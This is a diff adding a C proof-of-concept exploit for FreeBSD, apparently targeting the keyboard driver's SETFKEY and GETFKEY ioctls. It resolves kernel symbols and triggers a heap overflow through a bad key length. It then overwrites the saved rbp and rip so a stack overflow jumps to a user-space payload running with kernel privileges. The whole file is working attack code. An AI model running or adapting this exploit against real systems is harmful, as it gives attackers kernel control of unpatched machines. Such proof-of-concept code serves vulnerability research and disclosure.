@@ -1,0 +1,109 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stddef.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/kbio.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <sys/param.h>
+#include <sys/linker.h>
+
+int (*kprintf)(const char *fmt, ...);
+char *ostype;
+
+uint64_t originalRip;
+uint64_t originalRbp;
+
+void *resolve(char *name) {
+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void payload(void) {
+	kprintf("  [+] Entered kernel payload\n");
+	
+	strcpy(ostype, "CTurt  ");
+	
+	__asm__ volatile("swapgs; sysret");
+}
+
+// Copy the stack onto the heap
+void heapOverflow(int index, size_t size) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = size;
+	memset(&fkey.keydef, 0, 16);
+	
+	ioctl(0, SETFKEY, &fkey);
+}
+
+// Copy the heap onto the stack
+void stackOverflow(int index) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = 16;
+	memset(&fkey.keydef, 0, 16);
+	
+	ioctl(0, GETFKEY, &fkey);
+}
+
+int main(void) {
+	int result, i;
+	fkeyarg_t fkey;
+	
+	uint32_t ripLower4 = 0x808312cd; // jmp rbp
+	uint64_t rbp = (uint64_t)payload;
+	
+	
+	kprintf = resolve("printf");
+	ostype = resolve("ostype");
+	
+	
+	printf("  [+] Set full length for key 10\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, SETFKEY, &fkey);
+	
+	
+	printf("  [+] Set bad length and perform heap overflow\n");
+	heapOverflow(0, 128 - offsetof(fkeyarg_t, keydef) + 8 + 0x30 + sizeof(ripLower4));
+	
+	
+	printf("  [+] Prepare stack overflow memory\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, GETFKEY, &fkey);
+	originalRbp = *(uint64_t *)((char *)&fkey.keydef + 4);
+	originalRip = 0xffffffff00000000 | *(uint32_t *)((char *)&fkey.keydef + 12);
+	
+	printf("  [+] Original rip: %#lx\n", originalRip);
+	printf("  [+] Original rbp: %#lx\n", originalRbp);
+	
+	*(uint64_t *)((char *)&fkey.keydef + 4) = rbp;
+	*(uint32_t *)((char *)&fkey.keydef + 12) = ripLower4;
+	ioctl(0, SETFKEY, &fkey);
+	
+	
+	printf("  [+] Trigger stack overflow\n");
+	fflush(stdout);
+	
+	stackOverflow(0);
+	
+	
+	return 0;
+}
